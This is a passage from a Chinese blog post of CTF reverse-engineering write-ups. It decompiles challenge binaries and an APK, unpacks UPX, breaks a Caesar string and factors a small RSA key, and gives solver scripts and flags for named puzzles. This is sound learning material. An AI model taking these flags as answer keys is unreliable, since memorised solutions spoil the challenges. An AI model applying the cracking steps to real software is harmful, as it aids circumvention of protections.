                     data-src="/../Post_images/NKCTF-20230328.assets/1660751414871-8ddb2d6f-857a-4889-bc17-bafbf23484be.png"
                      alt="image.png"
                ><br>找到关键函数 DialogFunc  ，其中<code>strlen(String)==8</code>可知String是8位的字符，第57行的”U g3t 1T” “@_@”（you get it!）可知上面是程序加密的过程。<br>还能看到寄存器的位置也是连续的，以16进制的算法，<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660835185005-6dfde773-8d0e-4424-83d5-7c98061c901d.png"
                      alt="image.png"
                ><br>所以猜想函数<code>sub_4010F0</code>是对上面的数字的数组化处理，并且暂时当作char类型来处理，<br>写脚本将上面的数字转换成字符</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ec = [<span class="number">90</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">67</span>,<span class="number">97</span>,<span class="number">78</span>,<span class="number">72</span>,<span class="number">51</span>,<span class="number">110</span>,<span class="number">103</span>]</span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ec)):</span><br><span class="line">    tmp += <span class="built_in">chr</span>(ec[i])</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="comment">#得到的字符串是:ZJSECaNH3ng</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660833119509-5f53c884-449b-475b-b8d8-a8a5490ea4be.png"
                      alt="image.png"
                ><br>进入<code>sub_4010F0</code>函数 求出需要的v字符是<code>3CEHJNSZagn</code></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_4010F0</span><span class="params">(<span class="type">char</span>* a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//v5 = 4 * i; 因为是4字节所以直接可以将4给去掉</span></span><br><span class="line">    v5 = i;</span><br><span class="line">    v6 = a1[i];</span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; (a1[result]) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++i;</span><br><span class="line">          (a1[v5]) = (a1[result]);</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">while</span> ((a1 [i] ) &lt;= v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = <span class="number">4</span> * i;</span><br><span class="line">          (a1[result]) =a1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        --result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    a1 [result] = v6;</span><br><span class="line">    sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">    result = a3;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> v[] = <span class="string">&quot;ZJSECaNH3ng&quot;</span>;</span><br><span class="line">    sub_4010F0(v,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,v);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对应的变量</p>
<table>
<thead>
<tr>
<th>3</th>
<th>C</th>
<th>E</th>
<th>H</th>
<th>J</th>
<th>N</th>
<th>S</th>
<th>Z</th>
<th>a</th>
<th>g</th>
<th>n</th>
</tr>
</thead>
<tbody><tr>
<td>v7[0]</td>
<td>v7[1]</td>
<td>v8</td>
<td>v9</td>
<td>v10</td>
<td>v11</td>
<td>v12</td>
<td>v13</td>
<td>v14</td>
<td>v15</td>
<td>v16</td>
</tr>
</tbody></table>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660838644523-e94c85ba-9bae-4563-ae34-ec371d5285d8.png"
                      alt="image.png"
                ><br>通过返回的条件<br>String[0] &#x3D; ‘3’+34&#x3D; 51+34&#x3D;85&#x3D;’U’<br>String[1] &#x3D; ‘J’<br>String[2] &#x3D; (3<em>v8+141)&#x2F;4 &#x3D;87 &#x3D; ‘W’<br>String[3] &#x3D; 2</em>(v13&#x2F;9)*4 &#x3D; ‘P’<br>flag的前四位我们已经得出来了，还有后面的四位，查看v4 v5发现是base64加密的方法，直接用在线工具进行解密，得到v5 &#x3D;’WP1’ v4&#x3D; ‘jMp’,直接组装就得到flag了~~<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660839488648-c322e1be-0564-4e68-a7c7-676f8f7f1440.png"
                      alt="image.png"
                ><br>###flag{UJWP1jMp}</p>
<blockquote>
<p>这道题花了蛮长时间去理解 但是第一次真正写出能跑的脚本还是蛮高兴滴~</p>
</blockquote>
<h2 id="简单注册器"><a href="#简单注册器" class="headerlink" title="简单注册器"></a>简单注册器</h2><p>下载发现是一个apk的包，工具打开之后发现有一串可以的字符可以利用<br><code>&quot;dd2940c04462b4dd7c450528835cca15&quot;</code>除此之后好像都看不懂了，使用jeb查看源代码<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661067640492-4540f0cf-a5e4-4311-b277-eafac62d8df8.png"
                      alt="image.png"
                ><br>一开始没出来，右键点击MainActivity解析之后才出现能够看懂的代码<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661068233604-d772ab43-3f2d-44de-8cf5-ee960356b5da.png"
                      alt="image.png"
                ><br>这样就可以清楚的看到flag的加密过程，解出v5是关键。<br>写脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">v11 = <span class="number">0x1F</span></span><br><span class="line">v9 = <span class="number">2</span></span><br><span class="line">v2 = <span class="number">1</span></span><br><span class="line"><span class="built_in">str</span> = [<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;5&#x27;</span>]</span><br><span class="line"><span class="built_in">str</span>[v9] =<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>[v9]) + <span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">3</span>]) - <span class="number">50</span>)</span><br><span class="line"><span class="built_in">str</span>[<span class="number">4</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>[v9]) + <span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">5</span>]) - <span class="number">0x30</span>)</span><br><span class="line"><span class="built_in">str</span>[<span class="number">30</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>[v11]) + <span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">9</span>]) - <span class="number">0x30</span>)</span><br><span class="line"><span class="built_in">str</span>[<span class="number">14</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">27</span>]) + <span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">28</span>]) - <span class="number">97</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v0 = <span class="built_in">str</span>[<span class="number">0x1F</span>-i]</span><br><span class="line">    <span class="built_in">str</span>[<span class="number">0x1F</span>-i] = <span class="built_in">str</span>[i]</span><br><span class="line">    <span class="built_in">str</span>[i] = v0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment">#print(i,flag = &#x27;&#x27;)</span></span><br><span class="line">    <span class="built_in">print</span>(i,end=  <span class="string">&#x27;&#x27;</span>)  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;end = &#x27;&#x27;--&gt;python中“end=”是“print()”函数中的一个参数,会使该函数关闭</span></span><br><span class="line"><span class="string">是python的一个内置函数&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>###flag{59acc538825054c7de4b26440c0999dd}</p>
<h2 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a>[GWCTF 2019]pyre</h2><p>下载后发现是一个pyc文件，直接用网站来进行对pyc文件的转换，转为可以阅读的py文件。</p>
<blockquote>
<p>pyc文件是python文件经过编译后的二进制文件</p>
</blockquote>
<p>py文件的原文是</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>,<span class="string">&#x27;\x12&#x27;</span>,<span class="string">&#x27;\x1d&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;\x06&#x27;</span>,<span class="string">&#x27;\x14&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;\x1b&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>isinstance(object, classinfo)<br>如果参数object是classinfo的实例，或者object是classinfo类的子类的一个实例， 返回True。如果object不是一个给定类型的的对象， 则返回结果总是False。</p>
</blockquote>
<blockquote>
<p>str与string<br>String是一个模块，str是一个字符类型</p>
</blockquote>
<p>写脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>,<span class="string">&#x27;\x12&#x27;</span>,<span class="string">&#x27;\x1d&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;\x06&#x27;</span>,<span class="string">&#x27;\x14&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;\x1b&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(code[i], <span class="built_in">str</span>): <span class="comment">#str是字符串类型</span></span><br><span class="line">        code[i] = <span class="built_in">ord</span>(code[i])</span><br><span class="line"><span class="built_in">print</span>(code)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    code[j]=code[j]^code[j+<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    code[n] = code[n]-n</span><br><span class="line">    <span class="keyword">if</span> code[n]&lt;<span class="number">0</span>:</span><br><span class="line">        code[n] += <span class="number">128</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(code[n])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<p>###GWHT{Just_Re_1s_Ha66y!}</p>
<h3 id="pyd的逆向题"><a href="#pyd的逆向题" class="headerlink" title="pyd的逆向题"></a>pyd的逆向题</h3><h2 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a>[ACTF新生赛2020]easyre</h2><p>下载后的文件发现是加了upx壳的，所以首先要脱壳<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661586993644-3b05ee3d-beb6-475a-8217-8f2db4555a7b.png"
                      alt="image.png"
                ><br>查看这里_data_start__函数<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661587808535-a3719f18-5454-4607-ad7d-a99ae2e09604.png"
                      alt="image.png"
                ><br>看见qmemcpy(v4, “*F’&quot;N,&quot;(I?+@”, sizeof(v4))；这条函数，将”*F’&quot;N,&quot;(I?+@”拷贝至v4中去，<br>着眼观察for循环，看出最后的flag长度应该是12，将flag的ascii值作为下标取值，与v4数组进行比较，利用v4数组在_data_start__中找位置，就是要找的flag<br>v4的数组是这样的[42, 70, 39, 34, 78, 44, 34, 40, 73, 63, 43, 64]，使用python脚本进行转换</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc = (<span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>)</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> character <span class="keyword">in</span> enc:</span><br><span class="line">    flag.append(<span class="built_in">ord</span>(character))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<p>写解题脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8- -*-</span></span><br><span class="line">v4=[<span class="number">42</span>, <span class="number">70</span>, <span class="number">39</span>, <span class="number">34</span>, <span class="number">78</span>, <span class="number">44</span>, <span class="number">34</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">63</span>, <span class="number">43</span>, <span class="number">64</span>]</span><br><span class="line">enc=<span class="string">&#x27;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\&#x27;&amp;%$# !&quot;&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v4:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(enc.find(<span class="built_in">chr</span>(i))+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2022/png/23148330/1661598605508-1366a128-eda3-49c4-8e0d-280ac0f8d49f.png#averageHue=%232d2a27&clientId=ud7510f5e-8975-4&from=paste&height=27&id=uc344dada&originHeight=27&originWidth=151&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1405&status=done&style=none&taskId=u19f97967-66d4-41d1-8e68-dbfcec0b23b&title=&width=151"
                      alt="image.png"
                ><br>###flag{U9X_1S_W6@T?}</p>
<blockquote>
<p>find()函数</p>
</blockquote>
<h2 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h2><p>直接用GDA打开之后找主函数，<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661604312706-8a1afd05-2a8f-4967-bee8-d65f3b25276f.png"
                      alt="image.png"
                ><br>发现一行像flag的字符串，直接将字符串扒下来是<br><code>pvkq&#123;m164675262033l4m49lnp7p9mnk28k75&#125;</code><br>感觉像是凯撒密码，直接用解凯撒密码的在线工具，解出来flag<br>###flag{c164675262033b4c49bdf7f9cda28a75}</p>
<h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><blockquote>
<p>非对称算法（不传递密钥）<br>存在两个密钥：公钥和私钥<br>&lt;1&gt;c &#x3D; (m ^ e) % n ，<br>&#x3D;&gt;E N组成一个公钥对(n,e)<br>&lt;2&gt; m &#x3D; (c ^ d) % n<br>&#x3D;&gt;d是私钥</p>
</blockquote>
<p>:::tips<br>应用流程</p>
<ul>
<li>选取两个较大的互不相等的质数p和q，计算n&#x3D;p*q</li>
<li>计算phi&#x3D;(p-1)*(q-1)</li>
<li>选取任意e，使得e满足1&lt;e&lt;phi且gcd(e,phi)&#x3D;&#x3D;1</li>
<li>计算e关于n的模逆元d，且d满足(e * d)% n &#x3D;&#x3D;1</li>
<li>加解密c &#x3D; (m ^ e) % n ， m &#x3D; (c ^ d) % n 。其中m为明文，c为密文，(n,e)为公钥对，d为私钥，要求 0 &lt;&#x3D; m &lt; n<br>:::<br>首先获得两个不知道怎么看的文件，直接将两个文件的后缀名改为txt，查看文件的内容，<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661605521532-84047949-fc96-41f0-9f0e-4d3138c65e21.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661605532367-8540606a-3405-4321-b360-48ffdf8d79dd.png"
                      alt="image.png"
                ><br>使用在线工具<a class="link"   target="_blank" rel="noopener" href="http://www.hiencode.com/pub_asys.html" >SSL在线工具-公钥解析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>将解rsa要用的e和n解出来<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661605638036-ce804457-ee02-4314-b6ea-a61e117676df.png"
                      alt="image.png"
                ><br>这里需要用到大整数的分解工具yafu<br>将解出来的p(n)使用factor()进行大整数的分解n得到p和q<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661654207689-459ff1b9-c676-42ab-b7e6-47a829e672ad.png"
                      alt="image.png"
                ><br>p&#x3D;285960468890451637935629440372639283459<br>q&#x3D;304008741604601924494328155975272418463<br>利用代码求解</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p=<span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q=<span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phi_n) <span class="comment">#求d-&gt;e关于n的模逆元</span></span><br><span class="line">key=rsa.PrivateKey(n, e, <span class="built_in">int</span>(d), p, q) <span class="comment">#rsa的密钥</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\CTFofficesoftware\\other\\flag.txt&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file=file.read()</span><br><span class="line"><span class="built_in">print</span>(rsa.decrypt(file,key))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>这里的首先是文件的命名问题，不要用与模板名字相同的名字命名一个新文件<br>其次是文件的引用，应该是题目中给的文件而不是说自己去建一个新的文件</p>
</blockquote>
<h2 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h2><p>下载文件后找关键的字符函数，找到主函数后进行分析</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+25h] [ebp-33h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [esp+26h] [ebp-32h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// 